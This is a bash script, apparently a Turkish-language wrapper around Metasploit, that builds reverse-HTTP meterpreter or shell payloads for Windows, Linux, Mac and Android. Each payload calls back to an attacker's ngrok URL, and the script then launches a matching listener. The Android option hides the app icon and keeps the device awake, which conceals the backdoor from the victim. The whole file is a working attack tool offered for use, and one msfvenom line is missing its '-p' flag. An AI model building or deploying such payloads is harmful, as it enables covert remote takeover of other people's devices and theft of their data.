#!/bin/bash

clear
echo """

    _   ___  ___ _  __   _     __  __ ___ ___   _____ ___   ___  _    
   /_\ |   \| __| |/ /  /_\   |  \/  / __| __| |_   _/ _ \ / _ \| |   
  / _ \| |) | _|| ' <  / _ \  | |\/| \__ \ _|    | || (_) | (_) | |__ 
 /_/ \_\___/|___|_|\_\/_/ \_\ |_|  |_|___/_|     |_| \___/ \___/|____|
                                                                      
"""
sleep 0.5
echo """==============================="""
echo """   1 - Windows"""
echo """   2 - Linux"""
echo """   3 - Mac"""
echo """   4 - Android"""
echo """==============================="""
sleep 0.5

#

echo
echo "Seçiniz :"
read payload_no
echo
sleep 0.3
echo "NGROK URL'inizi giriniz :"
read ngrok_url
echo
sleep 0.3
echo "Payload Port'unu giriniz :"
read payload_port
echo
sleep 0.3
echo "Payload İsmini Giriniz :"
echo "Windows - .exe"
echo "Linux - .elf"
echo "Mac - .macho"
echo "Android - .apk"
echo
read payload_name
echo
sleep 0.5

#

if [ $payload_no = '1' ]; then
    echo "Payload Oluşturuluyor..."
    msfvenom -p windows/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
    echo 
    echo "Payload Oluşturuldu."
    echo "Dinleyiciyi Açmak İster misin ? (e/h)"
    read dinleyici
    if [ $dinleyici = 'e' ]; then
        echo "MSFConsole Başlatılıyor..."
        sleep 0.3
        msfconsole -x "use exploit/multi/handler;
        set payload windows/meterpreter/reverse_http;
        set lhost $ngrok_url;
        set lport $payload_port;
        exploit;"
    fi

elif [ $payload_no = '2' ]; then
    echo "Payload Oluşturuluyor..."
    msfvenom linux/x86/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
    echo 
    echo "Payload Oluşturuldu."
    echo "Dinleyiciyi Açmak İster misin ? (e/h)"
    read dinleyici
    if [ $dinleyici = 'e' ]; then
        echo "MSFConsole Başlatılıyor..."
        sleep 0.3
        msfconsole -x "use exploit/multi/handler;
        set payload linux/x86/meterpreter/reverse_http;
        set lhost $ngrok_url;
        set lport $payload_port;
        exploit;"
    fi

elif [ $payload_no = '3' ]; then
    echo "Payload Oluşturuluyor..."
    msfvenom -p osx/x86/shell_reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
    echo 
    echo "Payload Oluşturuldu."
    echo "Dinleyiciyi Açmak İster misin ? (e/h)"
    read dinleyici
    if [ $dinleyici = 'e' ]; then
        echo "MSFConsole Başlatılıyor..."
        sleep 0.3
        msfconsole -x "use exploit/multi/handler;
        set payload osx/x86/shell_reverse_http;
        set lhost $ngrok_url;
        set lport $payload_port;
        exploit;"
    fi

elif [ $payload_no = '4' ]; then
    echo "Payload Oluşturuluyor..."
    msfvenom -p android/meterpreter/reverse_http AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$ngrok_url lport=$payload_port -o "$payload_name"
    echo 
    echo "Payload Oluşturuldu."
    echo "Dinleyiciyi Açmak İster misin ? (e/h)"
    read dinleyici
    if [ $dinleyici = 'e' ]; then
        echo "MSFConsole Başlatılıyor..."
        sleep 0.3
        msfconsole -x "use exploit/multi/handler;
        set payload android/meterpreter/reverse_http;
        set lhost $ngrok_url;
        set lport $payload_port;
        exploit;"
    fi 
fi
